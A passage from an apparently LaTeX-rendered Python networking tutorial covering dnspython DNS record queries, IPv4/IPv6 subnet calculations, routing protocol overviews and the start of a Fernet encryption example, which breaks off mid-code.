You can use \texttt{dnspython} to perform various DNS queries such as A,
MX, and NS records.

\paragraph{Example: Querying A
Records}\label{example-querying-a-records}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_a\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ ipval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}IP\textquotesingle{}}\NormalTok{, ipval.to\_text())}

\NormalTok{query\_a\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: Querying MX
Records}\label{example-querying-mx-records}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_mx\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}MX\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ exchange }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}MX Record:\textquotesingle{}}\NormalTok{, exchange.exchange, }\StringTok{\textquotesingle{}Priority:\textquotesingle{}}\NormalTok{, exchange.preference)}

\NormalTok{query\_mx\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{DHCP (Dynamic Host Configuration
Protocol)}\label{dhcp-dynamic-host-configuration-protocol}

DHCP is a network management protocol used to automatically assign IP
addresses and other network configuration parameters to devices on a
network.

\subsection{Routing Protocols}\label{routing-protocols}

Routing protocols determine the best path for data to travel across a
network.

\subsubsection{RIP (Routing Information
Protocol)}\label{rip-routing-information-protocol}

RIP is a distance-vector routing protocol that uses hop count as a
routing metric. It's suitable for small networks.

\subsubsection{OSPF (Open Shortest Path
First)}\label{ospf-open-shortest-path-first}

OSPF is a link-state routing protocol that uses the shortest path first
algorithm. It is more efficient for larger and more complex networks.

\subsubsection{BGP (Border Gateway
Protocol)}\label{bgp-border-gateway-protocol}

BGP is a path-vector protocol used to exchange routing information
between autonomous systems on the internet.

\subsection{IPv4 and IPv6 Subnetting}\label{ipv4-and-ipv6-subnetting}

Subnetting divides a larger network into smaller sub-networks, improving
management and security.

\subsubsection{IPv4 Subnetting}\label{ipv4-subnetting}

IPv4 addresses are 32-bit numbers. Subnet masks define the network and
host portions of the address.

\paragraph{Example: Calculating Subnet Information for
IPv4}\label{example-calculating-subnet-information-for-ipv4}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ ipaddress}

\KeywordTok{def}\NormalTok{ ipv4\_subnet\_info(network):}
\NormalTok{    net }\OperatorTok{=}\NormalTok{ ipaddress.ip\_network(network)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Network: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Netmask: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{netmask}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Broadcast: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{broadcast\_address}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hosts: }\SpecialCharTok{\{}\BuiltInTok{list}\NormalTok{(net.hosts())}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{ipv4\_subnet\_info(}\StringTok{\textquotesingle{}192.168.1.0/24\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{IPv6 Subnetting}\label{ipv6-subnetting}

IPv6 addresses are 128-bit numbers, providing a significantly larger
address space than IPv4.

\paragraph{Example: Calculating Subnet Information for
IPv6}\label{example-calculating-subnet-information-for-ipv6}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ ipaddress}

\KeywordTok{def}\NormalTok{ ipv6\_subnet\_info(network):}
\NormalTok{    net }\OperatorTok{=}\NormalTok{ ipaddress.ip\_network(network)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Network: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Netmask: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{netmask}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Broadcast: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{broadcast\_address}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hosts: }\SpecialCharTok{\{}\BuiltInTok{list}\NormalTok{(net.hosts())[:}\DecValTok{5}\NormalTok{]}\SpecialCharTok{\}}\SpecialStringTok{..."}\NormalTok{)  }\CommentTok{\# Display first 5 hosts}

\NormalTok{ipv6\_subnet\_info(}\StringTok{\textquotesingle{}2001:0db8::/32\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example: Comprehensive Network Management
Script}\label{example-comprehensive-network-management-script}

This script combines DNS querying, subnet calculation, and basic routing
protocol concepts.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}
\ImportTok{import}\NormalTok{ ipaddress}

\CommentTok{\# Function to query DNS A record}
\KeywordTok{def}\NormalTok{ query\_a\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"A Records for }\SpecialCharTok{\{}\NormalTok{domain}\SpecialCharTok{\}}\SpecialStringTok{:"}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ ipval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}IP\textquotesingle{}}\NormalTok{, ipval.to\_text())}

\CommentTok{\# Function to query DNS MX record}
\KeywordTok{def}\NormalTok{ query\_mx\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}MX\textquotesingle{}}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"MX Records for }\SpecialCharTok{\{}\NormalTok{domain}\SpecialCharTok{\}}\SpecialStringTok{:"}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ exchange }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{\textquotesingle{}MX Record:\textquotesingle{}}\NormalTok{, exchange.exchange, }\StringTok{\textquotesingle{}Priority:\textquotesingle{}}\NormalTok{, exchange.preference)}

\CommentTok{\# Function to calculate IPv4 subnet information}
\KeywordTok{def}\NormalTok{ ipv4\_subnet\_info(network):}
\NormalTok{    net }\OperatorTok{=}\NormalTok{ ipaddress.ip\_network(network)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"IPv4 Network: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Netmask: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{netmask}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Broadcast: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{broadcast\_address}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hosts: }\SpecialCharTok{\{}\BuiltInTok{list}\NormalTok{(net.hosts())[:}\DecValTok{5}\NormalTok{]}\SpecialCharTok{\}}\SpecialStringTok{..."}\NormalTok{)  }\CommentTok{\# Display first 5 hosts}

\CommentTok{\# Function to calculate IPv6 subnet information}
\KeywordTok{def}\NormalTok{ ipv6\_subnet\_info(network):}
\NormalTok{    net }\OperatorTok{=}\NormalTok{ ipaddress.ip\_network(network)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"IPv6 Network: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Netmask: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{netmask}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Broadcast: }\SpecialCharTok{\{}\NormalTok{net}\SpecialCharTok{.}\NormalTok{broadcast\_address}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Hosts: }\SpecialCharTok{\{}\BuiltInTok{list}\NormalTok{(net.hosts())[:}\DecValTok{5}\NormalTok{]}\SpecialCharTok{\}}\SpecialStringTok{..."}\NormalTok{)  }\CommentTok{\# Display first 5 hosts}

\CommentTok{\# Main function to perform network management tasks}
\KeywordTok{def}\NormalTok{ main():}
    \CommentTok{\# DNS Queries}
\NormalTok{    query\_a\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\NormalTok{    query\_mx\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}

    \CommentTok{\# Subnet Calculations}
\NormalTok{    ipv4\_subnet\_info(}\StringTok{\textquotesingle{}192.168.1.0/24\textquotesingle{}}\NormalTok{)}
\NormalTok{    ipv6\_subnet\_info(}\StringTok{\textquotesingle{}2001:0db8::/32\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    main()}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-46}

Understanding network services and management, including DNS, DHCP,
routing protocols, and subnetting, is essential for effective network
design and administration. Python provides powerful tools like
\texttt{dnspython} for DNS queries and the \texttt{ipaddress} module for
subnet calculations. By mastering these tools and concepts, you can
efficiently manage and troubleshoot networks, ensuring optimal
performance and reliability.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive Tutorial for the \texttt{dnspython}
Module for Implementing DNS Query
Scripts}{Deep Dive Tutorial for the dnspython Module for Implementing DNS Query Scripts}}\label{deep-dive-tutorial-for-the-dnspython-module-for-implementing-dns-query-scripts}

The \texttt{dnspython} module is a powerful tool for working with DNS
(Domain Name System) in Python. It allows you to perform various DNS
operations, such as querying DNS records, updating DNS records, and
more. This tutorial will provide a comprehensive guide to using
\texttt{dnspython} for implementing DNS query scripts.

\section{Table of Contents}\label{table-of-contents-19}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-dnspython]{Introduction to
  \texttt{dnspython}}
\item
  \hyperref[installing-dnspython]{Installing \texttt{dnspython}}
\item
  \hyperref[basic-dns-queries]{Basic DNS Queries}
\item
  \hyperref[querying-different-types-of-dns-records]{Querying Different
  Types of DNS Records}
\item
  \hyperref[reverse-dns-lookups]{Reverse DNS Lookups}
\item
  \hyperref[advanced-dns-queries]{Advanced DNS Queries}
\item
  \hyperref[error-handling]{Error Handling}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{\texorpdfstring{Introduction to
\texttt{dnspython}}{Introduction to dnspython}}\label{introduction-to-dnspython}

\texttt{dnspython} is a DNS toolkit for Python. It supports almost all
record types defined in the DNS standards and allows for both querying
and updating DNS records. It is a versatile library suitable for various
DNS-related tasks.

\section{\texorpdfstring{Installing
\texttt{dnspython}}{Installing dnspython}}\label{installing-dnspython-1}

To install \texttt{dnspython}, you can use \texttt{pip}:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install dnspython}
\end{Highlighting}
\end{Shaded}

\section{Basic DNS Queries}\label{basic-dns-queries}

\subsection{Querying an A Record}\label{querying-an-a-record}

An A record maps a domain name to its corresponding IPv4 address.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_a\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ ipval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}A Record: }\SpecialCharTok{\{}\NormalTok{ipval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_a\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Querying an AAAA Record}\label{querying-an-aaaa-record}

An AAAA record maps a domain name to its corresponding IPv6 address.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_aaaa\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}AAAA\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ ipval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}AAAA Record: }\SpecialCharTok{\{}\NormalTok{ipval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_aaaa\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Querying Different Types of DNS
Records}\label{querying-different-types-of-dns-records}

\subsection{Querying MX Records}\label{querying-mx-records}

MX (Mail Exchange) records specify the mail servers responsible for
receiving email on behalf of a domain.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_mx\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}MX\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ mxval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}MX Record: }\SpecialCharTok{\{}\NormalTok{mxval}\SpecialCharTok{.}\NormalTok{exchange}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{ preference: }\SpecialCharTok{\{}\NormalTok{mxval}\SpecialCharTok{.}\NormalTok{preference}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_mx\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Querying NS Records}\label{querying-ns-records}

NS (Name Server) records specify the authoritative name servers for a
domain.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_ns\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}NS\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ nsval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}NS Record: }\SpecialCharTok{\{}\NormalTok{nsval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_ns\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Querying TXT Records}\label{querying-txt-records}

TXT (Text) records provide text information to sources outside your
domain.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_txt\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}TXT\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ txtval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}TXT Record: }\SpecialCharTok{\{}\NormalTok{txtval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_txt\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Querying CNAME Records}\label{querying-cname-records}

CNAME (Canonical Name) records map an alias name to a true or canonical
domain name.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_cname\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}CNAME\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ cnameval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}CNAME Record: }\SpecialCharTok{\{}\NormalTok{cnameval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_cname\_record(}\StringTok{\textquotesingle{}www.example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Querying SOA Records}\label{querying-soa-records}

SOA (Start of Authority) records provide information about the domain
and the corresponding DNS zone.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_soa\_record(domain):}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, }\StringTok{\textquotesingle{}SOA\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ soaval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}SOA Record: }\SpecialCharTok{\{}\NormalTok{soaval}\SpecialCharTok{.}\NormalTok{mname}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{ }\SpecialCharTok{\{}\NormalTok{soaval}\SpecialCharTok{.}\NormalTok{rname}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_soa\_record(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Reverse DNS Lookups}\label{reverse-dns-lookups}

Reverse DNS lookups find the domain name associated with an IP address.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}
\ImportTok{import}\NormalTok{ dns.reversename}

\KeywordTok{def}\NormalTok{ reverse\_dns\_lookup(ip):}
\NormalTok{    addr }\OperatorTok{=}\NormalTok{ dns.reversename.from\_address(ip)}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(addr, }\StringTok{\textquotesingle{}PTR\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ ptrval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Reverse DNS: }\SpecialCharTok{\{}\NormalTok{ptrval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    reverse\_dns\_lookup(}\StringTok{\textquotesingle{}8.8.8.8\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Advanced DNS Queries}\label{advanced-dns-queries}

\subsection{Specifying a DNS Server}\label{specifying-a-dns-server}

You can specify which DNS server to use for your queries.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_with\_custom\_dns(domain, dns\_server):}
\NormalTok{    resolver }\OperatorTok{=}\NormalTok{ dns.resolver.Resolver()}
\NormalTok{    resolver.nameservers }\OperatorTok{=}\NormalTok{ [dns\_server]}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ resolver.resolve(domain, }\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ ipval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}A Record: }\SpecialCharTok{\{}\NormalTok{ipval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_with\_custom\_dns(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}8.8.8.8\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Setting Timeout and
Retries}\label{setting-timeout-and-retries}

You can control the timeout and number of retries for DNS queries.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}

\KeywordTok{def}\NormalTok{ query\_with\_timeout(domain, timeout, retries):}
\NormalTok{    resolver }\OperatorTok{=}\NormalTok{ dns.resolver.Resolver()}
\NormalTok{    resolver.timeout }\OperatorTok{=}\NormalTok{ timeout}
\NormalTok{    resolver.lifetime }\OperatorTok{=}\NormalTok{ timeout }\OperatorTok{*}\NormalTok{ retries}
\NormalTok{    result }\OperatorTok{=}\NormalTok{ resolver.resolve(domain, }\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ ipval }\KeywordTok{in}\NormalTok{ result:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}A Record: }\SpecialCharTok{\{}\NormalTok{ipval}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    query\_with\_timeout(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{, }\DecValTok{1}\NormalTok{, }\DecValTok{3}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Error Handling}\label{error-handling-4}

Proper error handling is essential for robust DNS querying.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ dns.resolver}
\ImportTok{import}\NormalTok{ dns.exception}

\KeywordTok{def}\NormalTok{ safe\_dns\_query(domain, record\_type):}
    \ControlFlowTok{try}\NormalTok{:}
\NormalTok{        result }\OperatorTok{=}\NormalTok{ dns.resolver.resolve(domain, record\_type)}
        \ControlFlowTok{for}\NormalTok{ val }\KeywordTok{in}\NormalTok{ result:}
            \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}}\SpecialCharTok{\{}\NormalTok{record\_type}\SpecialCharTok{\}}\SpecialStringTok{ Record: }\SpecialCharTok{\{}\NormalTok{val}\SpecialCharTok{.}\NormalTok{to\_text()}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{except}\NormalTok{ dns.resolver.NXDOMAIN:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}The domain }\SpecialCharTok{\{}\NormalTok{domain}\SpecialCharTok{\}}\SpecialStringTok{ does not exist.\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{except}\NormalTok{ dns.resolver.Timeout:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Timeout occurred while querying }\SpecialCharTok{\{}\NormalTok{domain}\SpecialCharTok{\}}\SpecialStringTok{.\textquotesingle{}}\NormalTok{)}
    \ControlFlowTok{except}\NormalTok{ dns.exception.DNSException }\ImportTok{as}\NormalTok{ e:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}An error occurred: }\SpecialCharTok{\{}\NormalTok{e}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    safe\_dns\_query(}\StringTok{\textquotesingle{}example.com\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-47}

This tutorial has provided a comprehensive guide to using the
\texttt{dnspython} module for DNS querying. With \texttt{dnspython}, you
can perform a wide range of DNS operations, from basic queries to
advanced configurations. By understanding and utilizing this module, you
can build powerful network tools and services that leverage DNS data.

\bookmarksetup{startatroot}

\chapter{Advanced Networking Concepts with
Python}\label{advanced-networking-concepts-with-python}

Understanding advanced networking concepts is essential for building and
managing complex network infrastructures. This tutorial covers WAN
technologies and protocols, network security fundamentals including
encryption and firewalls, and computing infrastructures such as cloud
computing, virtualization, and data centers. We'll also demonstrate
basic encryption and decryption using the \texttt{cryptography} library
in Python.

\subsection{WAN Technologies and
Protocols}\label{wan-technologies-and-protocols}

Wide Area Networks (WANs) connect devices across large geographical
areas. Key WAN technologies and protocols include:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{MPLS (Multiprotocol Label Switching)}: A technique for routing
  network packets.
\item
  \textbf{VPN (Virtual Private Network)}: Extends a private network
  across a public network.
\item
  \textbf{Frame Relay}: A standardized wide area network technology that
  specifies the physical and logical link layers of digital
  telecommunications channels.
\item
  \textbf{ATM (Asynchronous Transfer Mode)}: A networking technology
  that transfers data in cells or packets of a fixed size.
\end{enumerate}

\subsection{Network Security
Fundamentals}\label{network-security-fundamentals}

Network security involves protecting networks from unauthorized access,
misuse, and data breaches. Key concepts include encryption and
firewalls.

\subsubsection{Encryption}\label{encryption}

Encryption transforms data into a secure format that can only be read by
someone with the appropriate decryption key.

\paragraph{\texorpdfstring{Installing the \texttt{cryptography}
Library}{Installing the cryptography Library}}\label{installing-the-cryptography-library}

First, install the \texttt{cryptography} library:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install cryptography}
\end{Highlighting}
\end{Shaded}

\paragraph{Basic Encryption and
Decryption}\label{basic-encryption-and-decryption}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ cryptography.fernet }\ImportTok{import}\NormalTok{ Fernet}

\CommentTok{\# Generate a key}
\NormalTok{key }\OperatorTok{=}\NormalTok{ Fernet.generate\_key()}
\NormalTok{cipher\_suite }\OperatorTok{=}\NormalTok{ Fernet(key)}

\CommentTok{\# Encrypt a message}
\NormalTok{message }\OperatorTok{=} \StringTok{b"Secret message"}
\NormalTok{encrypted\_message }\OperatorTok{=}\NormalTok{ cipher\_suite.encrypt(message)}
